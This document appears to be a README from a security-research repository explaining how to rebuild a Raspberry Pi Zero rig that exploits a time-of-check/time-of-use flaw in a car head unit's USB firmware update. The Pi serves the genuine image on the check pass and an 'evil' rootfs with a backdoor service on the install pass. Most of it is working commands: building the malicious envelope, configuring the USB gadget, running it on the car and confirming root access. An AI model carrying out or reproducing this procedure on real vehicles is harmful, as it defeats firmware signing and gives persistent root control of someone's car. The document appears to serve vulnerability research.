# Rebuild from zero

If you lost everything but this repo, this is the whole path back to a working rig. It
assumes you can supply three things and nothing else:

| Input | How you get it |
|---|---|
| **Genuine firmware package** (IONIQ5 update tree at the car's version, 260128) — contains `HU/images/mango-rootfs.tar.gz`, `.ver`, etc. | Fetch elsewhere (OEM update, your own backup). |
| **TE2 content key** (32 hex / AES-128) | You have it. Put it in `pizero/key.local` (one line) or `export TE2_CONTENT_KEY=…`. Never commit it. |
| **Raspberry Pi Zero 2 W** + an SD card (≥ 32 GB) | Hardware. |

Everything else — the decrypt tool (`pizero/gen5w_decrypt.py`), the envelope builder, the
image builder, the preflight gate, the nbdkit swap plugin, the systemd unit, the host config
— is in this repo. `pizero/DEPLOY.md` has the per-step detail; this file is the order and the
glue, including the Pi stability tweaks that aren't obvious.

---

## 0. Get the repo and the key onto the Pi

```bash
# on the Pi (user 'sjl' in the examples; adjust paths if different)
git clone <this-repo> ~/toctou-usb-update        # or copy the tree there
cd ~/toctou-usb-update/pizero
printf '%s\n' 'PUT_YOUR_32HEX_TE2_KEY_HERE' > key.local   # gitignored; or export TE2_CONTENT_KEY
chmod 600 key.local
```

> The systemd unit and `DEPLOY.md` use the path `~/toctou-usb-update/pizero` (i.e.
> `/home/sjl/toctou-usb-update/pizero`). If you clone elsewhere, edit the `ExecStart`/
> `WorkingDirectory`/`ConditionPathExists` paths in `pizero/toctou-gadget.service` to match.

## 1. Provision the Pi (one time)

```bash
sudo apt update && sudo apt install -y nbdkit nbdkit-plugin-python nbd-client exfatprogs
# USB gadget controller — the overlay MUST be under [all] on a Pi Zero 2 W (not [cm4/cm5/pi5]):
printf '\n[all]\ndtoverlay=dwc2,dr_mode=peripheral\n' | sudo tee -a /boot/firmware/config.txt
sudo reboot
# after reboot, BOTH must be true:
ls /sys/class/udc                                        # lists 3f980000.usb
readlink /sys/bus/platform/devices/3f980000.usb/driver   # ends in /dwc2  (NOT dwc_otg)
```

### 1b. Stability + offline logging (do this — it's why early car runs failed)

These are the fixes from the field journal. Without them the Pi reboots mid-install (watchdog)
and the log is unreadable offline.

```bash
# (a) disable the systemd hardware watchdog — it reset the board under install-pass I/O.
#     Applied on the NEXT boot (a live reload does NOT disarm an already-armed wdt).
sudo install -D pizero/system/99-no-watchdog.conf /etc/systemd/system.conf.d/99-no-watchdog.conf

# (b) persistent journald (the RPi vendor drop-in forces volatile; a higher-numbered /etc wins)
sudo install -D pizero/system/99-toctou-persistent.conf \
     /etc/systemd/journald.conf.d/99-toctou-persistent.conf

# (c) keep the wall clock roughly sane with no RTC / no wifi at the car
sudo apt install -y fake-hwclock

sudo reboot     # required so the watchdog disable actually takes effect
# verify after reboot:
systemctl show -p RuntimeWatchdogUSec    # => RuntimeWatchdogUSec=0
dmesg | grep -i 'hardware watchdog' || echo 'good: systemd not arming the wdt'
```

## 2. Build the attack artifacts

```bash
cd ~/toctou-usb-update/pizero
# evil envelope (byte-exact, IV-identical, integrity-valid, carries wideopen.service):
./01_make_evil_rootfs.sh /path/to/package/HU/images/mango-rootfs.tar.gz
#   -> build/evil_rootfs.te2

# baseline 27 GB exfat usb.img + regions.json (rootfs written first = one contiguous extent):
sudo ./02_build_usb_image.sh /path/to/package build/evil_rootfs.te2 build/usb.img exfat
#   -> build/usb.img, build/regions.json   (off/len of the rootfs extent, switch_after_pass=2)
```

Both `01` and the decrypt step read the TE2 key from `key.local` / `$TE2_CONTENT_KEY` via the
vendored `pizero/gen5w_decrypt.py` — no external tooling needed.

## 3. Preflight (go/no-go, before the car)

```bash
./04_preflight.sh /path/to/package      # checks A,B,D on the Pi; C auto-skips on ARM
```
- **A** baseline md5 == signed value, exact size.  **B** evil envelope occupies the same extent,
  differs in content.  **D** drives the real nbdkit plugin on your `usb.img`+`regions.json`:
  pass #1 genuine (check), pass #2 evil (install).
- Run the full gate including **C** (real x86-64 `DecryptToPIPE`) on an x86-64 bench if you have
  the package there. Expect `PREFLIGHT: OK`. **Do not go to the car on any FAIL.**

## 4. Deploy the gadget

```bash
# one-shot:
sudo ./03_deploy_gadget.sh
# or auto-present on every boot (power PWR port, data port -> HU, no shell):
sudo install -m0644 toctou-gadget.service /etc/systemd/system/toctou-gadget.service
sudo systemctl daemon-reload && sudo systemctl enable --now toctou-gadget.service
```
Re-arm before every attempt (a reboot or `systemctl restart toctou-gadget` resets the pass
counter to zero). Confirm armed: `grep -c 'pass #' /var/log/toctou.log` → `0`.

## 5. Run on the car, then verify

1. Plug the Pi's **data** port into the HU USB; start the software update from the HU menu.
2. Watch (or read back from the SD afterwards — it's offline-robust):
   ```bash
   tail -f /var/log/toctou.log           # look for: PASS #1 served=GENUINE, then *** SWITCH ***, PASS #2 served=EVIL
   cat    /var/log/toctou-reads.log      # every rootfs-region read: G/E, offset, pass
   ```
   Success = the **install pass (#2, after SWITCH)** shows `served=EVIL` with
   `bytes_evil ≈ 879,109,759`. If `SWITCH` lands on the wrong pass, bump `switch_after_pass`
   in `regions.json` to the pass the install actually runs on and redo.
3. On-device proof after the HU reboots (any one confirms it, detail in `pizero/STATUS.md`):
   the marker file `/var/log/TOCTOU_ROOT_PROOF`, the `IMEI [TOCTOU-PoC]` row in Modem
   Information, or the debug root login.

## 6. Tear down

```bash
sudo ./99_teardown.sh      # or: systemctl stop toctou-gadget.service
```

---

### Known open item (from the field journal)
On a clean boot with the watchdog confirmed off, the remaining risk is a dwc2 gadget hard-lock
(SoC reset, no crash log) under the HU's sustained read. If the Pi still resets with the
watchdog off, capture it over serial/netconsole rather than guessing — the local two-pass
`/dev/nbd0` load test never reboots, so any residual instability is specific to the USB gadget
path. See `docs/04-field-journal.md` §9.
